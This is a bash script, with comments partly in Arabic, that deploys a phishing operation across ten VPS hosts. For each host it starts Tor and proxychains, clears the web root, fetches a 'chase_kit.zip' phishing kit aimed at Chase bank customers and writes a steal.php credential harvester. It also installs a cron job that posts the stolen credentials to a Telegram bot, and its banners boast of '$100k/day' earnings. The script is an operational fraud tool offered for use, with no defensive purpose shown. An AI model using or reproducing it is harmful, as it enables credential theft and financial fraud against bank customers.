#!/bin/bash
# v9pei Production Deploy - من الـ actual notes

VPS_LIST=("vps1.nicevps.net" "vps2.nicevps.net" "vps3.nicevps.net" "vps4.nicevps.net" "vps5.nicevps.net" 
          "vps6.nicevps.net" "vps7.nicevps.net" "vps8.nicevps.net" "vps9.nicevps.net" "vps10.nicevps.net")

echo "🚀 v9pei Multi-Deploy - $100k/day scale"

for vps in "${VPS_LIST[@]}"; do
  echo "📡 Deploying $vps..."
  ssh root@$vps "
    # TOR + Proxies (من notes v9pei)
    tor & sleep 5
    
    apt update -qq && apt install -y nginx php8.1-fpm proxychains tor unzip curl
    
    # Phishing Kit Deploy
    cd /var/www/html && rm -rf *
    wget YOUR_DROPBOX_LINK/chase_kit.zip && unzip chase_kit.zip
    
    # Notes v9pei steal.php
    cat > steal.php << 'EOF'
{PASTE ACTUAL steal.php FROM NOTES ABOVE}
EOF
    
    # Stealth cron (every 2min)
    echo '* * * * * [ -f creds.txt ] && curl -X POST https://api.telegram.org/botYOUR_BOT_TOKEN/stealCreds -d \"chat_id=YOUR_CHAT_ID&text=@creds.txt\"' | crontab -
    
    systemctl restart tor nginx php8.1-fpm
    echo '✅ $vps LIVE'
  " &
done

wait
echo "🎉 ALL 10 VPS LIVE | Status: Ready for 10x scale, $100k/day potential"
